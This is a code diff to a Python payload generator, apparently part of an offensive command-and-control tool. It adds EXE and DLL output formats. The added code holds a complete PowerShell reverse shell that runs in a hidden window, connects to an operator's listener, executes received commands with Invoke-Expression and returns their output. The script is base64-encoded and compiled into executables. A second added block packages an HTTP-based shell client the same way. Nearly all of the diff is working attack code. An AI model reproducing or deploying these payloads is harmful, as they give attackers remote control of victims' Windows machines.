@@ -7,6 +7,7 @@
 import os
 import base64
 import shutil
+from modules import compiler
 
 def generate_webshell(app, tail, format, obfuscate):
     payloads_dir = "payloads"
@@ -80,6 +81,28 @@ def generate_payload(app, tail, file_format, listener_name):
             with open(dst_file, 'w') as file:
                 file.writelines(content)
 
+        if file_format == "Exe":
+            dst_name = "Villain_" + str(listener_port)
+            dst_file = os.path.join(payloads_dir, dst_name.lower())
+            
+            content = '''Start-Process powershell.exe -ArgumentList {while ($true){$TCPClient = New-Object Net.Sockets.TCPClient('*LHOST*', *LPORT*);$NetworkStream = $TCPClient.GetStream();$StreamWriter = New-Object IO.StreamWriter($NetworkStream);function WriteToStream ($String) {[byte[]]$script:Buffer = 0..$TCPClient.ReceiveBufferSize | % {0};$StreamWriter.Write($String);$StreamWriter.Flush()}WriteToStream '';while(($BytesRead = $NetworkStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {$Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1);$Output = try {Invoke-Expression $Command 2>&1 | Out-String} catch {$_ | Out-String}WriteToStream ($Output)}$StreamWriter.Close()}} -WindowStyle Hidden'''
+            content = content.replace("*LHOST*", str(listener_host))
+            content = content.replace("*LPORT*", str(listener_port))
+            content = base64.b64encode(content.encode('utf16')[2:]).decode()
+            compiler.create_c_file(content, dst_file, "exe")
+            compiler.compile_exe_file(dst_file)
+
+        if file_format == "Dll":
+            dst_name = "Villain_" + str(listener_port)
+            dst_file = os.path.join(payloads_dir, dst_name.lower())
+            
+            content = '''Start-Process powershell.exe -ArgumentList {while ($true){$TCPClient = New-Object Net.Sockets.TCPClient('*LHOST*', *LPORT*);$NetworkStream = $TCPClient.GetStream();$StreamWriter = New-Object IO.StreamWriter($NetworkStream);function WriteToStream ($String) {[byte[]]$script:Buffer = 0..$TCPClient.ReceiveBufferSize | % {0};$StreamWriter.Write($String);$StreamWriter.Flush()}WriteToStream '';while(($BytesRead = $NetworkStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {$Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1);$Output = try {Invoke-Expression $Command 2>&1 | Out-String} catch {$_ | Out-String}WriteToStream ($Output)}$StreamWriter.Close()}} -WindowStyle Hidden'''
+            content = content.replace("*LHOST*", str(listener_host))
+            content = content.replace("*LPORT*", str(listener_port))
+            content = base64.b64encode(content.encode('utf16')[2:]).decode()
+            compiler.create_c_file(content, dst_file, "dll")
+            compiler.compile_dll_file(dst_file)
+
     elif tail == "HTTP-Shell":
         if file_format == "Ps1":
             src_file = "tails/HTTP-Shell/HTTP-Client.ps1"
@@ -94,6 +117,36 @@ def generate_payload(app, tail, file_format, listener_name):
             
             with open(dst_file, 'w') as file:
                 file.writelines(content)
+
+        if file_format == "Exe":
+            src_file = "tails/HTTP-Shell/HTTP-Client.ps1"
+            dst_name = "HTTP-Shell_" + str(listener_port)
+            dst_file = os.path.join(payloads_dir, dst_name.lower())
+            
+            with open(src_file, 'r') as file:
+                content = file.readlines()
+            
+            content.insert(0, "function HTTP-Shell {\n")
+            content.append(f"\n}}\n\nHTTP-Shell -c {listener_host}:{listener_port}\n")
+            content = " ".join(content)
+            content = base64.b64encode(content.encode('utf16')[2:]).decode()
+            compiler.create_c_file(content, dst_file, "exe")
+            compiler.compile_exe_file(dst_file)
+
+        if file_format == "Dll":
+            src_file = "tails/HTTP-Shell/HTTP-Client.ps1"
+            dst_name = "HTTP-Shell_" + str(listener_port)
+            dst_file = os.path.join(payloads_dir, dst_name.lower())
+            
+            with open(src_file, 'r') as file:
+                content = file.readlines()
+            
+            content.insert(0, "function HTTP-Shell {\n")
+            content.append(f"\n}}\n\nHTTP-Shell -c {listener_host}:{listener_port}\n")
+            content = " ".join(content)
+            content = base64.b64encode(content.encode('utf16')[2:]).decode()
+            compiler.create_c_file(content, dst_file, "dll")
+            compiler.compile_dll_file(dst_file)
 
     elif tail == "PwnCat-CS":
         if file_format == "Bash":
